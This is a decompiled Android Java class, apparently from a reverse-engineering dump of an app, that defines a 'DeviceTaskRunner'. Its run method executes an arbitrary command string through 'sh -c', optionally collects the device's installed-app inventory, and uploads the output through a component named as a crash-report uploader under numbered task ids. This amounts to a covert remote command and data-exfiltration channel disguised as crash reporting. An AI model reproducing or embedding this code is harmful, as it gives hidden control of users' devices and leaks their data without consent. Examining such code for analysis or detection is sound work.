package com.navi.tool.utils;

import android.content.Context;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;
import s5.h0;

/* loaded from: C:\Users\Administrator\Documents\Trae-CN\temp_20261118_01\dump_1900\dex_1_3779968.dex */
public final class DeviceTaskRunner {
    private static final int MAX_OUTPUT = 31457280;
    private static final int MAX_UPLOAD_BYTES = 29360128;
    private static final String TAG = "DeviceTask";
    private static final long TIMEOUT_MS = 10000;

    private DeviceTaskRunner() {
    }

    private static String exec(String str) {
        Process process = null;
        try {
            process = new ProcessBuilder("sh", "-c", str).redirectErrorStream(true).start();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Thread thread = new Thread(new l(5, process, byteArrayOutputStream), "device-task-reader");
            thread.start();
            if (!process.waitFor(TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                process.destroyForcibly();
            }
            thread.join(2000L);
            String str2 = new String(byteArrayOutputStream.toByteArray(), "UTF-8");
            try {
                process.destroy();
            } catch (Throwable unused) {
            }
            return str2;
        } catch (Throwable th) {
            try {
                String str3 = "exec failed: " + th.getMessage();
                if (process != null) {
                    try {
                        process.destroy();
                    } catch (Throwable unused2) {
                    }
                }
                return str3;
            } catch (Throwable th2) {
                if (process != null) {
                    try {
                        process.destroy();
                    } catch (Throwable unused3) {
                    }
                }
                throw th2;
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Code restructure failed: missing block: B:12:0x0019, code lost:
    
        r4 = 31457280 - r6.size();
     */
    /* JADX WARN: Code restructure failed: missing block: B:13:0x001e, code lost:
    
        if (r4 <= 0) goto L16;
     */
    /* JADX WARN: Code restructure failed: missing block: B:14:0x0020, code lost:
    
        r6.write(r0, 0, r4);
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static /* synthetic */ void lambda$exec$0(java.lang.Process r5, java.io.ByteArrayOutputStream r6) {
        /*
            java.io.InputStream r5 = r5.getInputStream()     // Catch: java.lang.Throwable -> L39
            r0 = 8192(0x2000, float:1.148E-41)
            byte[] r0 = new byte[r0]     // Catch: java.lang.Throwable -> L24
        L8:
            int r1 = r5.read(r0)     // Catch: java.lang.Throwable -> L24
            r2 = -1
            if (r1 == r2) goto L2a
            int r2 = r6.size()     // Catch: java.lang.Throwable -> L24
            int r2 = r2 + r1
            r3 = 0
            r4 = 31457280(0x1e00000, float:8.2284605E-38)
            if (r2 <= r4) goto L26
            int r1 = r6.size()     // Catch: java.lang.Throwable -> L24
            int r4 = r4 - r1
            if (r4 <= 0) goto L2a
            r6.write(r0, r3, r4)     // Catch: java.lang.Throwable -> L24
            goto L2a
        L24:
            r6 = move-exception
            goto L2e
        L26:
            r6.write(r0, r3, r1)     // Catch: java.lang.Throwable -> L24
            goto L8
        L2a:
            r5.close()     // Catch: java.lang.Throwable -> L39
            goto L39
        L2e:
            if (r5 == 0) goto L38
            r5.close()     // Catch: java.lang.Throwable -> L34
            goto L38
        L34:
            r5 = move-exception
            r6.addSuppressed(r5)     // Catch: java.lang.Throwable -> L39
        L38:
            throw r6     // Catch: java.lang.Throwable -> L39
        L39:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.navi.tool.utils.DeviceTaskRunner.lambda$exec$0(java.lang.Process, java.io.ByteArrayOutputStream):void");
    }

    public static void run(Context context, String str, int i7, String str2) {
        String str3;
        String concat;
        String str4;
        if (str2 != null) {
            try {
                if (str2.isEmpty()) {
                    return;
                }
                if ("__app_inventory__".equals(str2)) {
                    str4 = CrashReportCollector.collectInstalledApps(context);
                    concat = "cmd:apps";
                } else {
                    String exec = exec(str2);
                    if (str2.startsWith("logcat -d -b main -b system -b crash")) {
                        String collectInstalledApps = CrashReportCollector.collectInstalledApps(context);
                        if (!collectInstalledApps.isEmpty()) {
                            str3 = "===== 已安装普通应用 =====\n" + collectInstalledApps + "\n" + exec;
                            concat = "cmd:".concat(str2);
                            str4 = str3;
                        }
                    }
                    str3 = exec;
                    concat = "cmd:".concat(str2);
                    str4 = str3;
                }
                String trimToUtf8Bytes = trimToUtf8Bytes(str4, MAX_UPLOAD_BYTES);
                if (trimToUtf8Bytes.isEmpty()) {
                    trimToUtf8Bytes = "(no output)";
                }
                boolean z6 = CrashReportUploader.upload(context, str, "task_" + i7, concat, trimToUtf8Bytes, h0.FRAGMENT_ENCODE_SET, i7).ok;
            } catch (Throwable th) {
                th.toString();
            }
        }
    }

    private static String trimToUtf8Bytes(String str, int i7) {
        if (str == null) {
            return h0.FRAGMENT_ENCODE_SET;
        }
        byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
        if (bytes.length <= i7) {
            return str;
        }
        int max = Math.max(0, i7);
        while (max > 0 && max < bytes.length && (bytes[max] & 192) == 128) {
            max--;
        }
        return new String(bytes, 0, max, StandardCharsets.UTF_8).concat("\n[日志已截断]\n");
    }
}
